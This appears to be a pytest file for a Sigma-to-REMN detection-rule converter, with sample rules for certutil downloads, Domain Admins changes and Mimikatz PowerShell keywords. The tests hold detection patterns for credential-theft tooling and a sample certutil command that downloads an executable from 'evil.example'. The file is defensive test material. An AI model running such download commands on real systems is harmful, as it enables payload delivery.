"""Sigma -> REMN converter: translation fidelity and end-to-end execution on the SQL engine."""
from __future__ import annotations

import json
import os
import uuid
from pathlib import Path

import pytest
import yaml

from services.rules import sigma
from services.store import rules as R
from services.store.casestore import StoreRegistry
from services.store.sqlfilter import Ctx, compile_cond
from services.store.writers import EventWriter

FIXTURE = Path(__file__).resolve().parents[1] / "fixtures" / "sigma_converted.yaml"

CERTUTIL = """
title: Suspicious Certutil Download
id: 11111111-1111-1111-1111-111111111111
status: test
description: Detects certutil.exe used to download a file
   over HTTP.
references:
  - https://example.org/certutil
author: REMN tests
date: 2024/01/01
tags:
  - attack.command_and_control
  - attack.t1105
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    - Image|endswith: '\\certutil.exe'
    - OriginalFileName: 'CertUtil.exe'
  selection_cli:
    CommandLine|contains|all:
      - '-urlcache'
      - 'http'
  filter_main:
    ParentImage|endswith: '\\explorer.exe'
  condition: all of selection_* and not filter_main
falsepositives:
  - Administrator activity
level: high
"""

ADMIN_GROUP = """
title: User Added To Domain Admins
id: 22222222-2222-2222-2222-222222222222
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID:
      - 4728
      - 4732
      - 4756
    TargetSid|endswith: '-512'
  filter:
    SubjectUserName|endswith: '$'
  condition: selection and not filter
level: medium
"""

PS_KEYWORDS = """
title: Mimikatz Keywords In PowerShell
logsource:
  product: windows
  category: ps_script
detection:
  keywords:
    - 'Invoke-Mimikatz'
    - 'DumpCreds'
  condition: keywords
level: critical
"""

MODIFIERS = """
title: Modifier Coverage
logsource:
  product: windows
  category: network_connection
detection:
  selection:
    DestinationIp|cidr: '10.0.0.0/8'
    Image|contains|windash: ' -s '
    CommandLine|contains: 'foo*bar'
    DestinationPort|gt: 1024
    User: null
  condition: selection
level: low
"""

UNSUPPORTED = """
title: Base64 Offset
logsource: {product: windows, category: process_creation}
detection:
  selection:
    CommandLine|base64offset|contains: 'IEX'
  condition: selection
level: high
---
title: Linux Rule
logsource: {product: linux, category: process_creation}
detection:
  selection:
    Image|endswith: '/nc'
  condition: selection
level: high
---
title: Aggregation
logsource: {product: windows, service: security}
detection:
  selection:
    EventID: 4625
  condition: selection | count() by TargetUserName > 5
level: high
---
title: Two Of Three
logsource: {product: windows, service: security}
detection:
  a: {EventID: 1}
  b: {EventID: 2}
  c: {EventID: 3}
  condition: 2 of them
level: high
"""


def _ev(**kw):
    base = {"ts": 1_725_000_000_000, "tsIso": "2026-09-01T00:00:00Z", "computer": "PC1", "level": 4, "data": {}}
    base.update(kw)
    base["raw"] = json.dumps({"Event": {"EventData": base["data"], "System": {"EventID": base.get("eventId")}}})
    return base


@pytest.fixture
def store(tmp_path):
    reg = StoreRegistry()
    reg.configure(tmp_path / "cases")
    st = reg.get(str(uuid.uuid4()))
    yield st
    reg.close_all()


def test_process_creation_rule_translates_and_runs(store):
    res = sigma.convert_text(CERTUTIL, "certutil.yml")
    assert len(res) == 1 and res[0]["ok"], res
    rule = res[0]["rule"]
    assert rule["id"] == "sigma-11111111-1111-1111-1111-111111111111"
    assert rule["severity"] == "high" and rule["source"] == "events"
    assert rule["attack"] == ["T1105"] and "process_creation" in rule["tags"] and "command-and-control" in rule["tags"]
    assert rule["sigma"]["falsepositives"] == ["Administrator activity"]
    # compiles on the SQL engine
    compile_cond(rule["where"], Ctx(source="events"))
    # golden fixture shared with the vitest parity test (regenerate with REMN_UPDATE_FIXTURES=1)
    if os.environ.get("REMN_UPDATE_FIXTURES"):
        FIXTURE.write_text(res[0]["yaml"], encoding="utf-8")
    assert yaml.safe_load(FIXTURE.read_text(encoding="utf-8")) == rule

    w = EventWriter(store, 1)
    sysmon = "Microsoft-Windows-Sysmon/Operational"
    w.add(_ev(eventId=1, channel=sysmon, image=r"C:\Windows\System32\certutil.exe", commandLine="certutil -urlcache -split -f http://evil.example/a.exe a.exe",
              parentImage=r"C:\Windows\System32\cmd.exe", data={"Image": r"C:\Windows\System32\certutil.exe"}))
    w.add(_ev(eventId=1, channel=sysmon, image=r"C:\Windows\System32\certutil.exe", commandLine="certutil -urlcache -f http://x/y",
              parentImage=r"C:\Windows\explorer.exe"))  # filtered: parent explorer
    w.add(_ev(eventId=4688, channel="Security", processName=r"C:\Windows\System32\certutil.exe", commandLine="CERTUTIL -URLCACHE http://x",
              parentProcessName=r"C:\Windows\System32\cmd.exe"))  # Security 4688 alias of Image
    w.add(_ev(eventId=1, channel=sysmon, image=r"C:\Windows\notepad.exe", commandLine="notepad -urlcache http", parentImage=r"C:\a.exe"))
    w.add(_ev(eventId=7, channel=sysmon, image=r"C:\Windows\System32\certutil.exe", commandLine="certutil -urlcache http"))  # wrong event id
    w.flush()
    hits = R.run_rule(store, rule, {})
    assert len(hits) == 2, hits
    assert sorted(r for h in hits for r in h["refs"]) == [1, 3]


def test_security_service_and_null_and_lists():
    rule = sigma.convert_text(ADMIN_GROUP)[0]
    assert rule["ok"], rule
    w = rule["rule"]["where"]
    # channel + event list + filter as a not-block
    assert w["channel"] == "Security" and w["eventId|in"] == [4728, 4732, 4756] and w["targetSid|endswith"] == "-512"
    assert w["not"] == {"subjectUser|endswith": "$"}
    compile_cond(w, Ctx(source="events"))


def test_keywords_and_powershell_category():
    rule = sigma.convert_text(PS_KEYWORDS)[0]
    assert rule["ok"]
    w = rule["rule"]["where"]
    assert w["channel|contains"] == "powershell/operational" and w["eventId"] == 4104
    assert w["raw|contains_any"] == ["Invoke-Mimikatz", "DumpCreds"]
    assert rule["rule"]["severity"] == "critical" and rule["rule"]["id"] == "sigma-mimikatz-keywords-in-powershell"


def test_modifiers():
    rule = sigma.convert_text(MODIFIERS)[0]
    assert rule["ok"], rule
    w = rule["rule"]["where"]
    assert w["destinationIp|startswith"] == "10."
    # arbitrary prefixes become an octet-range regex (172.16.0.0/12 = 172.16-31.x.x)
    r12 = sigma.compile_field("DestinationIp|cidr", "172.16.0.0/12", {}, [])["destinationIp|re"]
    import re as _re

    assert _re.match(r12, "172.20.1.9") and _re.match(r12, "172.31.255.255") and not _re.match(r12, "172.32.0.1") and not _re.match(r12, "172.15.0.1")
    r30 = sigma.compile_field("DestinationIp|cidr", "192.168.1.4/30", {}, [])["destinationIp|re"]
    assert _re.match(r30, "192.168.1.6") and not _re.match(r30, "192.168.1.8")
    assert set(w["image|contains_any"]) >= {" -s ", " /s "}
    assert w["commandLine|re"] == "foo.*bar"
    assert w["destinationPort|gt"] == 1024
    assert w["user|exists"] is False
    compile_cond(w, Ctx(source="events"))


def test_unsupported_constructs_are_skipped_not_weakened():
    res = sigma.convert_text(UNSUPPORTED)
    assert [r["ok"] for r in res] == [False, False, False, False]
    assert "base64offset" in res[0]["error"]
    assert "linux" in res[1]["error"]
    assert "aggregation" in res[2]["error"]
    assert "2 of" in res[3]["error"]


def test_unmapped_fields_use_event_data_and_unknown_service_warns():
    text = """
title: Odd Fields
logsource: {product: windows, service: some-new-provider}
detection:
  selection:
    SomeNewField|startswith: 'abc'
    Provider_Name: 'Microsoft-Windows-Foo'
  condition: selection
level: low
"""
    res = sigma.convert_text(text)[0]
    assert res["ok"] and res["warnings"] and "some-new-provider" in res["warnings"][0]
    w = res["rule"]["where"]
    assert w["channel|contains"] == "some-new-provider" and w["data.SomeNewField|startswith"] == "abc" and w["provider"] == "Microsoft-Windows-Foo"
    compile_cond(w, Ctx(source="events"))


def test_informational_level_is_enrichment_not_an_alert():
    text = """title: User Logoff Event
id: 0badd08f-c6a3-4630-90d3-6875cca440be
status: test
level: informational
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID:
            - 4634
            - 4647
    condition: selection
"""
    r = sigma.convert_text(text, "logoff.yml")[0]
    assert not r["ok"] and "informational" in r["error"]
